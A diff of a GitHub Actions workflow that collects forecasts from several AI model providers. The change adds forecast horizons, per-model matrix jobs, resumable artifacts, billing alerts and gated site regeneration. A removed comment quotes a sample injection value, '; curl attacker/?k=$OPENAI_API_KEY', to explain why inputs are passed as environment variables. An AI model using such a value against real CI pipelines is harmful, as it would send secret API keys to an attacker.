@@ -2,16 +2,28 @@ name: Elicit end-state forecasts
 
 on:
   schedule:
-    # 14:00 UTC on the 1st of every month. Gated on the ELICITATION_ENABLED
-    # repository variable so scheduled runs stay off until keys are configured.
+    # 14:00 UTC on the 1st of every month. Scheduled sweeps ask all three
+    # horizons. One matrix job owns one active model and asks its horizons in
+    # sequence, keeping slow models below the hosted-runner wall-clock limit.
     - cron: '0 14 1 * *'
   workflow_dispatch:
     inputs:
+      horizons:
+        description: 'Forecast horizon(s)'
+        type: choice
+        required: true
+        default: long-term
+        options:
+          - long-term
+          - '2030'
+          - '2040'
+          - 2030+2040
+          - all
       models:
-        description: 'Comma-separated model keys from tools/models.json (default: all)'
+        description: 'Comma-separated active model keys from tools/models.json (default: all active)'
         required: false
       samples:
-        description: 'Samples per model'
+        description: 'Samples per model and horizon'
         required: false
         default: '20'
       check_only:
@@ -25,23 +37,128 @@ on:
         required: false
         default: false
       budget_minutes:
-        description: 'Per-model wall-clock budget in minutes (default 45; slow reasoning models need more)'
+        description: 'Per-model, per-horizon wall-clock budget in minutes'
         required: false
+        default: '90'
       resume_from_run_id:
-        description: 'Restore batches and checkpoints from a previous run id, and pay only for what is missing'
+        description: 'Restore the combined runs artifact from a previous workflow run id and buy only what is missing'
         required: false
+
+# A second sweep should wait, not race the first one to publish competing
+# branches or spend twice on the same model/date/horizon.
+concurrency:
+  group: machine-futures-elicitation
+  cancel-in-progress: false
 
 permissions:
   contents: write
   pull-requests: write
-  # Needed to raise a billing alert when a provider reports no credit.
   issues: write
-  # Needed to pull a previous run's artifact when resuming.
   actions: read
 
 jobs:
-  elicit:
+  plan:
     if: github.event_name == 'workflow_dispatch' || vars.ELICITATION_ENABLED == 'true'
+    runs-on: ubuntu-latest
+    outputs:
+      should_elicit: ${{ steps.plan.outputs.should_elicit }}
+      horizons: ${{ steps.plan.outputs.horizons }}
+      models: ${{ steps.plan.outputs.models }}
+      run_date: ${{ steps.plan.outputs.run_date }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+
+      - name: Restore the original elicitation date
+        if: ${{ inputs.resume_from_run_id != '' && !inputs.check_only && !inputs.list_models }}
+        uses: actions/download-artifact@v4
+        with:
+          name: runs-${{ inputs.resume_from_run_id }}
+          path: plan-restored/
+          run-id: ${{ inputs.resume_from_run_id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build the model and horizon matrices
+        id: plan
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          HORIZON_SELECTION: ${{ inputs.horizons }}
+          REQUESTED_MODELS: ${{ inputs.models }}
+          CHECK_ONLY: ${{ inputs.check_only }}
+          LIST_MODELS: ${{ inputs.list_models }}
+          RESUME_RUN_ID: ${{ inputs.resume_from_run_id }}
+          BUDGET_MINUTES: ${{ inputs.budget_minutes || '90' }}
+        run: |
+          set -euo pipefail
+
+          if [ "${CHECK_ONLY:-false}" = "true" ] || [ "${LIST_MODELS:-false}" = "true" ]; then
+            echo 'should_elicit=false' >> "$GITHUB_OUTPUT"
+            echo 'horizons=[]' >> "$GITHUB_OUTPUT"
+            echo 'models=[]' >> "$GITHUB_OUTPUT"
+            echo 'run_date=' >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          if [ -n "${RESUME_RUN_ID:-}" ]; then
+            manifest=$(find plan-restored -type f -name '.elicitation-date' -print -quit)
+            if [ -z "$manifest" ]; then
+              echo "::error::The runs-$RESUME_RUN_ID artifact has no elicitation-date manifest; refusing to resume under a new date."
+              exit 1
+            fi
+            run_date=$(tr -d '[:space:]' < "$manifest")
+          else
+            run_date=$(date -u +%F)
+          fi
+          RUN_DATE="$run_date" node -e 'const value=process.env.RUN_DATE; const date=new Date(`${value}T00:00:00Z`); if (!/^\d{4}-\d{2}-\d{2}$/.test(value) || Number.isNaN(date.valueOf()) || date.toISOString().slice(0,10)!==value) throw new Error(`invalid elicitation date ${JSON.stringify(value)}`)'
+
+          selection="${HORIZON_SELECTION:-all}"
+          if [ "$EVENT_NAME" = "schedule" ]; then selection=all; fi
+          case "$selection" in
+            long-term) horizons='["long-term"]' ;;
+            2030) horizons='["2030"]' ;;
+            2040) horizons='["2040"]' ;;
+            2030+2040) horizons='["2030","2040"]' ;;
+            all) horizons='["long-term","2030","2040"]' ;;
+            *) echo "::error::Unsupported horizon selection: $selection"; exit 1 ;;
+          esac
+
+          # Each runner gets five minutes beyond its own budget to flush a
+          # final batch. Refuse combinations that could reach the job timeout
+          # before the always-run artifact upload steps get a chance to run.
+          HORIZONS_JSON="$horizons" node -e '
+            const budget = Number(process.env.BUDGET_MINUTES);
+            const count = JSON.parse(process.env.HORIZONS_JSON).length;
+            if (!Number.isFinite(budget) || budget < 1 || budget > 240) throw new Error(`budget_minutes must be from 1 to 240; received ${JSON.stringify(process.env.BUDGET_MINUTES)}`);
+            if ((budget + 5) * count > 315) throw new Error(`${count} horizons at ${budget} minutes each could outrun the resumable-artifact window; reduce the budget or split the dispatch`);
+          '
+
+          models=$(node --input-type=module <<'NODE'
+          import { readFileSync } from 'node:fs';
+          const roster = JSON.parse(readFileSync('tools/models.json', 'utf8')).models;
+          const active = roster.filter(model => (model.status || 'active') === 'active');
+          const requested = (process.env.REQUESTED_MODELS || '').split(',').map(value => value.trim()).filter(Boolean);
+          const byKey = new Map(roster.map(model => [model.key, model]));
+          const unknown = requested.filter(key => !byKey.has(key));
+          const inactive = requested.filter(key => byKey.has(key) && (byKey.get(key).status || 'active') !== 'active');
+          if (unknown.length) throw new Error(`unknown model key(s): ${unknown.join(', ')}`);
+          if (inactive.length) throw new Error(`inactive model key(s) cannot be elicited: ${inactive.join(', ')}`);
+          const selected = requested.length ? requested : active.map(model => model.key);
+          if (!selected.length) throw new Error('no active models selected');
+          process.stdout.write(JSON.stringify(selected));
+          NODE
+          )
+
+          echo 'should_elicit=true' >> "$GITHUB_OUTPUT"
+          echo "horizons=$horizons" >> "$GITHUB_OUTPUT"
+          echo "models=$models" >> "$GITHUB_OUTPUT"
+          echo "run_date=$run_date" >> "$GITHUB_OUTPUT"
+
+  utility:
+    needs: plan
+    if: ${{ github.event_name == 'workflow_dispatch' && (inputs.check_only || inputs.list_models) }}
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -61,7 +178,12 @@ jobs:
           DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
           MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY || secrets.MINSTRAL_API_KEY }}
           MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY || secrets.KIMI_API_KEY }}
-        run: node tools/run-elicitation.mjs --list
+          MODELS: ${{ inputs.models }}
+        run: |
+          set -euo pipefail
+          argv=(--list)
+          if [ -n "${MODELS:-}" ]; then argv+=(--models "$MODELS"); fi
+          node tools/run-elicitation.mjs "${argv[@]}"
 
       - name: Preflight — verify keys and model ids
         if: inputs.check_only
@@ -81,34 +203,65 @@ jobs:
           if [ -n "${MODELS:-}" ]; then argv+=(--models "$MODELS"); fi
           node tools/run-elicitation.mjs "${argv[@]}"
 
-      # Resuming restores whatever the earlier run had already collected:
-      # finished batches are not bought again, and half-finished models pick up
-      # from their checkpoint. This is the recovery path after a run that died
-      # partway or stopped on an empty account.
+  elicit:
+    needs: plan
+    if: needs.plan.outputs.should_elicit == 'true'
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        model: ${{ fromJSON(needs.plan.outputs.models) }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 330
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+
+      # Every model job restores the same combined artifact, then copies only
+      # its model's batches into an isolated working directory. Its uploaded
+      # artifact therefore cannot overwrite another model's newer checkpoint
+      # when the aggregation job merges all twenty artifacts.
       - name: Restore a previous run
-        if: ${{ inputs.resume_from_run_id != '' && !inputs.check_only && !inputs.list_models }}
+        if: ${{ inputs.resume_from_run_id != '' }}
         uses: actions/download-artifact@v4
         with:
           name: runs-${{ inputs.resume_from_run_id }}
-          path: runs/
+          path: restored/
           run-id: ${{ inputs.resume_from_run_id }}
           github-token: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Report what was restored
-        if: ${{ inputs.resume_from_run_id != '' && !inputs.check_only && !inputs.list_models }}
+      - name: Prepare this model's resumable workspace
+        env:
+          MODEL_KEY: ${{ matrix.model }}
+          RUN_DATE: ${{ needs.plan.outputs.run_date }}
         run: |
           set -euo pipefail
-          echo "Restored $(ls runs/*.json 2>/dev/null | wc -l) batch(es) and $(ls runs/.partial/*.jsonl 2>/dev/null | wc -l) checkpoint(s) from run ${{ inputs.resume_from_run_id }}."
-          node tools/verify-runs.mjs
+          mkdir -p work/runs/.partial
+          model_slug=$(MODEL_KEY="$MODEL_KEY" node --input-type=module <<'NODE'
+          import { readFileSync } from 'node:fs';
+          const roster = JSON.parse(readFileSync('tools/models.json', 'utf8')).models;
+          const model = roster.find(candidate => candidate.key === process.env.MODEL_KEY);
+          if (!model) throw new Error(`unknown model key ${process.env.MODEL_KEY}`);
+          process.stdout.write(model.model.toLowerCase().replace(/[^a-z0-9.]+/g, '-').replace(/^-+|-+$/g, ''));
+          NODE
+          )
 
-      # Dispatch inputs reach the shell as environment variables rather than
-      # expression interpolation: this step holds every provider API key, so a
-      # value like "; curl attacker/?k=$OPENAI_API_KEY" must never be able to
-      # become a command. The harness validates the values themselves.
-      - name: Elicit forecasts
+          for source in runs restored; do
+            if [ ! -d "$source" ]; then continue; fi
+            find "$source" -maxdepth 1 -type f -name "*__${model_slug}__closed_book__end-states*.json" -exec cp '{}' work/runs/ \;
+            if [ -d "$source/.partial" ]; then
+              find "$source/.partial" -maxdepth 1 -type f -name "*__${model_slug}__closed_book__end-states*.jsonl" -exec cp '{}' work/runs/.partial/ \;
+            fi
+          done
+          touch "work/runs/.partial/.artifact-${MODEL_KEY}"
+          printf '%s\n' "$RUN_DATE" > work/runs/.partial/.elicitation-date
+
+      - name: Elicit selected horizons
         id: elicit
         continue-on-error: true
-        if: ${{ !inputs.check_only && !inputs.list_models }}
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
@@ -118,50 +271,129 @@ jobs:
           DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
           MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY || secrets.MINSTRAL_API_KEY }}
           MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY || secrets.KIMI_API_KEY }}
+          MODEL_KEY: ${{ matrix.model }}
+          HORIZONS_JSON: ${{ needs.plan.outputs.horizons }}
+          RUN_DATE: ${{ needs.plan.outputs.run_date }}
           SAMPLES: ${{ inputs.samples || '20' }}
-          MODELS: ${{ inputs.models }}
-          BUDGET_MINUTES: ${{ inputs.budget_minutes }}
+          BUDGET_MINUTES: ${{ inputs.budget_minutes || '90' }}
+        run: |
+          set -uo pipefail
+          result=0
+          quota=false
+
+          while IFS= read -r horizon; do
+            echo "Asking $MODEL_KEY for horizon $horizon"
+            timeout_seconds=$(BUDGET_MINUTES="$BUDGET_MINUTES" node -e 'process.stdout.write(String(Math.ceil(Number(process.env.BUDGET_MINUTES) * 60) + 300))')
+            GITHUB_OUTPUT='' timeout --foreground --signal=TERM --kill-after=30s "${timeout_seconds}s" node tools/run-elicitation.mjs \
+              --models "$MODEL_KEY" \
+              --horizon "$horizon" \
+              --date "$RUN_DATE" \
+              --samples "$SAMPLES" \
+              --budget-minutes "$BUDGET_MINUTES" \
+              --out work/runs
+            status=$?
+            if [ "$status" -eq 4 ]; then
+              quota=true
+              result=4
+              break
+            elif [ "$status" -ne 0 ] && [ "$result" -eq 0 ]; then
+              result=2
+            fi
+          done < <(HORIZONS_JSON="$HORIZONS_JSON" node -e 'for (const horizon of JSON.parse(process.env.HORIZONS_JSON)) console.log(horizon)')
+
+          echo "quota_exhausted=$quota" >> "$GITHUB_OUTPUT"
+          echo "failed=$([ "$result" -eq 0 ] && echo false || echo true)" >> "$GITHUB_OUTPUT"
+          exit "$result"
+
+      - name: Record model-job status
+        if: always()
+        env:
+          MODEL_KEY: ${{ matrix.model }}
+          OUTCOME: ${{ steps.elicit.outcome }}
+          QUOTA: ${{ steps.elicit.outputs.quota_exhausted || 'false' }}
+        run: |
+          mkdir -p work/runs/.partial
+          printf 'outcome=%s\nquota=%s\n' "$OUTCOME" "$QUOTA" > "work/runs/.partial/.status-${MODEL_KEY}"
+
+      - name: Upload this model's batches and checkpoints
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: model-${{ matrix.model }}-${{ github.run_id }}
+          path: work/runs/
+          include-hidden-files: true
+          retention-days: 90
+
+      - name: Fail this model job after preserving its data
+        if: steps.elicit.outcome == 'failure'
+        run: |
+          echo "::error::${{ matrix.model }} did not complete every selected horizon; its paid samples are preserved."
+          exit 1
+
+  aggregate:
+    needs: [plan, elicit]
+    if: ${{ always() && needs.plan.outputs.should_elicit == 'true' }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+
+      - name: Download every model artifact
+        uses: actions/download-artifact@v4
+        with:
+          pattern: model-*-${{ github.run_id }}
+          path: collected/
+          merge-multiple: true
+
+      - name: Merge batches and inspect model-job status
+        id: merge
         run: |
           set -euo pipefail
-          argv=(--samples "$SAMPLES")
-          if [ -n "${MODELS:-}" ]; then argv+=(--models "$MODELS"); fi
-          if [ -n "${BUDGET_MINUTES:-}" ]; then argv+=(--budget-minutes "$BUDGET_MINUTES"); fi
-          node tools/run-elicitation.mjs "${argv[@]}"
+          mkdir -p runs/.partial
+          cp -R collected/. runs/
 
-      # Elicitation costs real money, so the batches are persisted before any
-      # step that could fail — including the elicitation step itself, which is
-      # why it is continue-on-error above and this is always(). One model
-      # running out of credit used to discard every batch already collected.
-      # The partial checkpoints come too: they are what makes a re-run pay only
-      # for the shortfall.
-      - name: Upload raw batches
-        if: ${{ always() && !inputs.check_only && !inputs.list_models }}
+          failed=false
+          quota_models=''
+          for status_file in runs/.partial/.status-*; do
+            if [ ! -f "$status_file" ]; then continue; fi
+            if grep -q '^outcome=failure$' "$status_file"; then failed=true; fi
+            if grep -q '^quota=true$' "$status_file"; then
+              model=${status_file##*.status-}
+              quota_models="${quota_models}${quota_models:+, }${model}"
+            fi
+          done
+          rm -f runs/.partial/.status-* runs/.partial/.artifact-*
+
+          echo "failed=$failed" >> "$GITHUB_OUTPUT"
+          echo "quota_models=$quota_models" >> "$GITHUB_OUTPUT"
+
+      # This is the artifact future re-dispatches restore. It is written before
+      # verification or publishing so a downstream bug cannot strand paid data.
+      - name: Upload the combined resumable run
+        if: always()
         uses: actions/upload-artifact@v4
         with:
           name: runs-${{ github.run_id }}
-          path: |
-            runs/
-            !runs/.mock/
+          path: runs/
           include-hidden-files: true
           retention-days: 90
 
       - name: Verify raw batches
-        if: ${{ always() && !inputs.check_only && !inputs.list_models }}
         run: node tools/verify-runs.mjs
 
-      # Money problems get their own issue, because they are the one failure
-      # mode a re-run cannot fix on its own — and a red run in the Actions tab
-      # is easy to miss, while an issue arrives by email.
       - name: Raise a billing alert
-        if: ${{ always() && steps.elicit.outputs.quota_exhausted == 'true' }}
+        if: steps.merge.outputs.quota_models != ''
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          MODELS: ${{ steps.elicit.outputs.quota_models }}
+          MODELS: ${{ steps.merge.outputs.quota_models }}
           RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
         run: |
           set -euo pipefail
           gh label create billing --color B60205 --description "Provider quota or credit" 2>/dev/null || true
-          # One open issue is enough; a monthly cron should not file twelve.
           if [ -n "$(gh issue list --label billing --state open --limit 1 --json number --jq '.[].number')" ]; then
             echo "A billing issue is already open — not filing another."
             exit 0
@@ -169,72 +401,56 @@ jobs:
           gh issue create \
             --title "Elicitation blocked: out of quota or credit" \
             --label billing \
-            --body "$(printf '%s\n' \
-              "Elicitation stopped on these models for billing reasons:" \
-              "" \
-              "**$MODELS**" \
-              "" \
-              "Full per-model detail is in the job summary: $RUN_URL" \
-              "" \
-              "Top up or raise the limit, then re-run the workflow. Samples already collected are restored from the run's checkpoint artifact, so only the shortfall is paid for again.")"
+            --body "Elicitation stopped for these model keys: **$MODELS**. Paid samples are preserved in the combined artifact. Top up the affected provider and resume from workflow run ${{ github.run_id }}. Full run: $RUN_URL"
 
-      # Stop here if elicitation failed outright: importing a partial sweep
-      # would publish a board with models missing.
-      - name: Fail the run if elicitation did
-        if: ${{ steps.elicit.outcome == 'failure' && !inputs.check_only && !inputs.list_models }}
-        run: |
-          echo "::error::Elicitation reported failures — batches are saved as an artifact; see the job summary."
-          exit 1
-
-      # The raw batches go up before anything derived is built from them. They
-      # are the half of this repository that cannot be regenerated, and a bug
-      # in a downstream check must not be able to strand a paid run on a
-      # runner. This step is always() for the same reason the artifact is.
+      # Raw JSON batches are pushed even when a model came back short. The site
+      # is regenerated only after every selected model and horizon completed.
       - name: Push the raw batches
         id: push_runs
-        if: ${{ always() && !inputs.check_only && !inputs.list_models }}
         run: |
           set -euo pipefail
-          BRANCH="elicitation/${{ github.run_id }}"
-          git config user.name  "github-actions[bot]"
+          branch="elicitation/${{ github.run_id }}"
+          git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git checkout -b "$BRANCH"
+          git checkout -b "$branch"
           git add runs
           if git diff --cached --quiet; then
             echo "No new batches to push."
-            echo "pushed=false" >> "$GITHUB_OUTPUT"
+            echo 'pushed=false' >> "$GITHUB_OUTPUT"
             exit 0
           fi
-          git commit -m "Add raw elicitation batches"
-          git push origin "$BRANCH"
-          echo "pushed=true" >> "$GITHUB_OUTPUT"
-          echo "Raw batches pushed to \`$BRANCH\`." >> "$GITHUB_STEP_SUMMARY"
+          git commit -m "Add raw horizon elicitation batches"
+          git push origin "$branch"
+          echo 'pushed=true' >> "$GITHUB_OUTPUT"
+          echo "Raw batches pushed to \`$branch\`." >> "$GITHUB_STEP_SUMMARY"
 
-      - name: Import into site data
-        if: ${{ !inputs.check_only && !inputs.list_models }}
+      - name: Import every horizon into site data
+        if: needs.elicit.result == 'success' && steps.merge.outputs.failed == 'false'
         run: |
           set -euo pipefail
           node tools/import-runs.mjs
           node tools/export-data.mjs
 
-      # Syntax alone was checked before, and only on the generated file — a
-      # run could publish a valid-JS allocation that did not sum to 100, or an
-      # app.js that never parsed.
-      - name: Check the site
-        if: ${{ !inputs.check_only && !inputs.list_models }}
+      - name: Check the complete site
+        if: needs.elicit.result == 'success' && steps.merge.outputs.failed == 'false'
         run: node tools/check-all.mjs
 
-      # A second commit on the same branch, so a failed check above leaves the
-      # batches pushed and the regenerated site behind, rather than losing both.
       - name: Push the regenerated site
-        if: ${{ !inputs.check_only && !inputs.list_models }}
+        if: needs.elicit.result == 'success' && steps.merge.outputs.failed == 'false'
         run: |
           set -euo pipefail
-          BRANCH="elicitation/${{ github.run_id }}"
+          branch="elicitation/${{ github.run_id }}"
           git add public/data.js data
           if git diff --cached --quiet; then
-            echo "No site changes to commit."; exit 0
+            echo "No site changes to commit."
+            exit 0
           fi
-          git commit -m "Regenerate site data from the new batches"
-          git push origin "$BRANCH"
-          echo "Site data pushed. Open a PR from \`$BRANCH\` to publish." >> "$GITHUB_STEP_SUMMARY"
+          git commit -m "Regenerate all horizon datasets"
+          git push origin "$branch"
+          echo "Site data pushed. Open a PR from \`$branch\` to publish." >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Fail after preserving incomplete results
+        if: ${{ always() && (needs.elicit.result != 'success' || steps.merge.outputs.failed == 'true') }}
+        run: |
+          echo "::error::At least one model/horizon is incomplete. Raw batches and checkpoints were preserved; resume from run ${{ github.run_id }}."
+          exit 1
